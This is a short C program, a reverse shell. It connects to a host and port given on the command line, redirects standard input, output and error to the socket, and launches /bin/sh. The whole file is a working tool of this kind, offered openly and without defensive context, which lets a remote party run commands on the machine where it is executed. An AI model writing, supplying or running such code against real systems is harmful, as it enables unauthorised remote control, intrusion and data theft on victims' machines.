#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <err.h>

int main(int argc, char **argv)
{
    if (argc != 3)
    {
        printf("Usage: ./reverse_shell <host> <port>\n");
        return 1;
    }

    char *host = argv[1];
    char *port = argv[2];
    struct addrinfo hints;
    struct addrinfo *res = NULL;
    struct addrinfo *rp = NULL;
    int sfd = 0;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = 0;
    hints.ai_protocol = 0;

    int s = getaddrinfo(host, port, &hints, &res);

    if (s != 0)
        errx(1, "Error during getaddrinfo");

    for (rp = res; rp != NULL; rp = rp->ai_next)
    {
        sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);

        if (sfd == -1)
            continue;

        if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
            break;

        close(sfd);
    }

    freeaddrinfo(res);

    if (rp == NULL)
        errx(1, "Not connected");

    printf("%s\n", "Connected");

    dup2(sfd, 0);
    dup2(sfd, 1);
    dup2(sfd, 2);

    char **arg = { NULL };

    int code = execve("/bin/sh", arg, NULL);
    if (code < 0)
        errx(1, "command not find");
}
